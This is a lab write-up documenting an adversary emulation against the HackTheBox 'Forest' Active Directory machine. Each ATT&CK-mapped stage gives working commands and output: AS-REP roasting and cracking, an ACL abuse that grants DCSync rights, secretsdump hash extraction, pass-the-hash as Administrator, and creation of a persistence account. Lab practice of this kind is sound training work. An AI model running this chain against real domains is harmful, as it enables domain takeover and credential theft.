# Forest
This plan documents a full adversary emulation against HackTheBox's _Forest_ machine, based on the attack path actually executed and recorded in `Forest.md`. Each stage below lists the action performed, its ATT&CK technique mapping, the tool/command used, and its execution status

![](Forest_image.png)

Stage 1 – Reconnaissance
------------------------

**Action:** Full TCP port scan and service/version enumeration  
**ATT&CK Technique:** T1595 (Active Scanning)   
**Tooling:** Nmap
**Command:**

```text-plain
nmap -p- -sCV --min-rate 2500 -vv -oN nmap 10.129.95.210
```

**Result:** Confirmed Windows Server 2016 Domain Controller for `htb.local`, with LDAP, Kerberos, SMB, and WinRM exposed

```
# Nmap 7.99 scan initiated Thu Jun 18 14:09:00 2026 as: /usr/lib/nmap/nmap --privileged -p- -sCV --min-rate 2500 -vv -oN nmap 10.129.95.210
Increasing send delay for 10.129.95.210 from 160 to 320 due to 175 out of 583 dropped probes since last increase.
Increasing send delay for 10.129.95.210 from 320 to 640 due to 9265 out of 30883 dropped probes since last increase.
Increasing send delay for 10.129.95.210 from 640 to 1000 due to 102 out of 339 dropped probes since last increase.
Nmap scan report for 10.129.95.210 (10.129.95.210)
Host is up, received reset ttl 127 (0.13s latency).
Scanned at 2026-06-18 14:09:01 EDT for 113s
Not shown: 65511 closed tcp ports (reset)
PORT      STATE SERVICE      REASON          VERSION
53/tcp    open  domain       syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-06-18 18:16:32Z)
135/tcp   open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap         syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds syn-ack ttl 127 Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?    syn-ack ttl 127
593/tcp   open  ncacn_http   syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped   syn-ack ttl 127
3268/tcp  open  ldap         syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped   syn-ack ttl 127
5985/tcp  open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf       syn-ack ttl 127 .NET Message Framing
47001/tcp open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49668/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49670/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49680/tcp open  ncacn_http   syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49681/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49685/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49697/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
56448/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2026-06-18T11:17:28-07:00
| smb2-time: 
|   date: 2026-06-18T18:17:25
|_  start_date: 2026-06-18T17:57:37
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 36501/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 44040/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 32697/udp): CLEAN (Timeout)
|   Check 4 (port 53941/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: mean: 2h26m50s, deviation: 4h02m32s, median: 6m48s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
```

Stage 2 – Discovery (Anonymous Domain Enumeration)
--------------------------------------------------

**Action:** Establish an anonymous/null LDAP bind to enumerate domain information without credentials  
**ATT&CK Technique:** T1087.002 (Domain Account)  
**Tooling:** NetExec (`nxc`)   
**Command:**

```text-plain
nxc ldap 10.129.95.210 -u '' -p ''
```

**Result:** Anonymous LDAP bind succeeded, confirming the domain controller permits unauthenticated enumeration

```
LDAP        10.129.95.210   389    FOREST           [*] Windows 10 / Server 2016 Build 14393 (name:FOREST) (domain:htb.local) (signing:None) (channel binding:No TLS cert)                   
LDAP        10.129.95.210   389    FOREST           [+] htb.local\:
```

Stage 3 – Credential Access (AS-REP Roasting)
---------------------------------------------

**Action:** Request AS-REP hashes for domain accounts with Kerberos pre-authentication disabled, using the same anonymous LDAP access  
**ATT&CK Technique:** T1558.004 (AS-REP Roasting)  
**Tooling:** NetExec (`nxc`)  
**Command:**

```text-plain
nxc ldap 10.129.95.210 -u '' -p '' --asreproast output.txt
```

**Result:** Retrieved a crackable AS-REP hash for `svc-alfresco`.

```
LDAP        10.129.95.210   389    FOREST           [*] Windows 10 / Server 2016 Build 14393 (name:FOREST) (domain:htb.local) (signing:None) (channel binding:No TLS cert)                   
LDAP        10.129.95.210   389    FOREST           [+] htb.local\:                                                                                                                          
LDAP        10.129.95.210   389    FOREST           [*] Total of records returned 1                                                                                                          
LDAP        10.129.95.210   389    FOREST           $krb5asrep$23$svc-alfresco@HTB.LOCAL:f0f04032cefc16c18295d56564366ef3$1ae5a0d070<EDITED>4df
```

Stage 4 – Credential Access (Offline Cracking)
----------------------------------------------

**Action:** Crack the AS-REP hash offline using a dictionary attack  
**ATT&CK Technique:** T1110.002 (Password Cracking)  
**Tooling:** Hashcat (mode 18200, `rockyou.txt`)   
**Result:** Recovered plaintext credentials: `svc-alfresco:s3rvice`

```
Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$krb5asrep$23$svc-alfresco@HTB.LOCAL:f0f04032ce<EDITED>7bd661585654ffd964df:s3rvice

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
```

Stage 5 – Execution / Initial Foothold
--------------------------------------

**Action:** Authenticate as `svc-alfresco` via Windows Remote Management and execute commands to confirm access  
**ATT&CK Technique:** T1021.006 (Remote Services: Windows Remote Management)  
**Tooling:** NetExec (`nxc`)  
**Command:**

```text-plain
nxc winrm 10.129.95.210 -u 'svc-alfresco' -p 's3rvice'
```

**Result:** Confirmed interactive-equivalent access as `svc-alfresco`
```
WINRM       10.129.95.210   5985   FOREST           [*] Windows 10 / Server 2016 Build 14393 (name:FOREST) (domain:htb.local) 
WINRM       10.129.95.210   5985   FOREST           [+] htb.local\svc-alfresco:s3rvice (Pwn3d!)
```

Stage 6 – Discovery (AD Relationship Mapping)
---------------------------------------------

**Action:** Collect Active Directory relationship data (group memberships, ACLs, trusts, sessions) using the `svc-alfresco` foothold  
**ATT&CK Technique:** T1069.002 (Permission Groups Discovery: Domain Groups)  
**Tooling:** NetExec BloodHound collection module   
**Command:**

```text-plain
nxc ldap 10.129.95.210 -u 'svc-alfresco' -p 's3rvice' --dns-server 10.129.95.210 --bloodhound -c all
```

**Result:** Identified a privilege escalation path: `svc-alfresco` → `GenericAll` over `Exchange Windows Permissions` group → `WriteDacl` over the `HTB.LOCAL` domain object

```
LDAP        10.129.95.210   389    FOREST           [*] Windows 10 / Server 2016 Build 14393 (name:FOREST) (domain:htb.local) (signing:None) (channel binding:No TLS cert) 
LDAP        10.129.95.210   389    FOREST           [+] htb.local\svc-alfresco:s3rvice 
LDAP        10.129.95.210   389    FOREST           Resolved collection methods: objectprops, acl, rdp, session, container, psremote, dcom, localadmin, trusts, group
LDAP        10.129.95.210   389    FOREST           Done in 1M 9S
LDAP        10.129.95.210   389    FOREST           Compressing output into /home/yutsuna/.nxc/logs/FOREST_10.129.95.210_2026-06-18_141840_bloodhound.zip
```

Stage 7 – Privilege Escalation (Group Membership Abuse)
-------------------------------------------------------

**Action:** Abuse the `GenericAll` right to add `svc-alfresco` as a member of the `Exchange Windows Permissions` group  
**ATT&CK Technique:** T1098 (Account Manipulation)  
**Tooling:** `net rpc`   
**Command:**

```text-plain
net rpc group addmem 'EXCHANGE WINDOWS PERMISSIONS' 'svc-alfresco' -U htb.local/'svc-alfresco'%'s3rvice' -S 10.129.95.210
```

**Result:** `svc-alfresco` confirmed as a member of `Exchange Windows Permissions`, inheriting its `WriteDacl` right over the domain object

```
net rpc group members 'EXCHANGE WINDOWS PERMISSIONS'  -U htb.local/'svc-alfresco'%'s3rvice' -S 10.129.95.210                 
HTB\Exchange Trusted Subsystem
HTB\svc-alfresco
```

Stage 8 – Privilege Escalation (ACL Abuse)
------------------------------------------

**Action:** Use the inherited `WriteDacl` right to directly grant `svc-alfresco` the DCSync replication rights on the domain object  
**ATT&CK Technique:** T1098 (Account Manipulation)  
**Tooling:** `bloodyAD`   
**Command:**

```text-plain
bloodyAD -d htb.local -u 'svc-alfresco' -p 's3rvice' --dc-ip 10.129.95.210 --host forest.htb.local add dcsync 'CN=SVC-ALFRESCO,OU=SERVICE ACCOUNTS,DC=HTB,DC=LOCAL'
```

**Result:** `svc-alfresco` now holds `Replicating Directory Changes` and `Replicating Directory Changes All` rights
```
[+] CN=SVC-ALFRESCO,OU=SERVICE ACCOUNTS,DC=HTB,DC=LOCAL is now able to DCSync
```

Stage 9 – Credential Access (DCSync)
------------------------------------

**Action:** Use the newly granted replication rights to extract domain account hashes via the DRSUAPI protocol.   
**ATT&CK Technique:** T1003.006 (OS Credential Dumping: DCSync)  
**Tooling:** Impacket `secretsdump.py`  
**Command:**

```text-plain
impacket-secretsdump 'htb.local'/'svc-alfresco':'s3rvice'@'forest.htb.local' -dc-ip 10.129.95.210
```

**Result:** Extracted the `Administrator` NTLM hash via the DRSUAPI method (the preceding `RemoteOperations`/RRP step failed with access denied, since `svc-alfresco` holds only replication rights, not local admin on the DC — confirming the dump succeeded purely through DCSync, not an alternate route).
```
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
<SNIP>
```

Stage 10 – Lateral Movement (Pass-the-Hash)
-------------------------------------------

**Action:** Authenticate as `Administrator` using the extracted NTLM hash directly, without needing the plaintext password  
**ATT&CK Technique:** T1550.002 (Use Alternate Authentication Material: Pass the Hash)  
**Tooling:** NetExec (`nxc`)  
**Command:**

```text-plain
nxc smb 10.129.95.210 -u Administrator -H '32693b11e6aa90eb43d32c72a07ceea6'
```

**Result:** Full Domain Admin access confirmed
```
SMB         10.129.95.210   445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True) (Null Auth:True)
SMB         10.129.95.210   445    FOREST           [+] htb.local\Administrator:32693b11e6aa90eb43d32c72a07ceea6 (Pwn3d!)

```
## Stage 11 – Persistence (Domain Account Creation)
**Action:** Establish persistence by creating an additional domain user account in the Active Directory environment.
**ATT&CK Technique:** T1136.002 (Create Account: Domain Account)
**Tooling:** nxc
**Execution Plan:**

1. Use the administrative access obtained during the previous attack stages.
2. Create a new domain user named `backup_test_user` in the authorized laboratory environment.
3. Configure the account with a strong password and standard user permissions.
4. Verify that the new account exists in Active Directory.
5. Test authentication using the newly created account.
6. Examine Windows Security Event ID 4720 to identify the account creation event.
7. Remove the test account after completing the experiment.

```
nxc smb 10.129.95.210 -u Administrator -H '32693b11e6aa90eb43d32c72a07ceea6' -x "net user backup_test_user Str00!23@%nGG1!_Passw0rd123! /add /domain"
```
**Security Relevance:** Attackers may create additional domain accounts to maintain access after the original compromised account is disabled or its password is changed.

**Detection:** Monitor Event ID 4720 for newly created user accounts and investigate unexpected account creation by privileged users.

### Small Note on MITRE CALDERA

CALDERA automates adversary emulation by chaining ATT&CK-mapped "abilities" into a repeatable "operation." This plan mirrors that structure – each stage is effectively an ability (technique, tooling, command, status) – but was documented manually, since Forest's specific misconfigurations (anonymous LDAP, Exchange group nesting, ACL/DCSync grant) required manual exploitation rather than generic CALDERA abilities
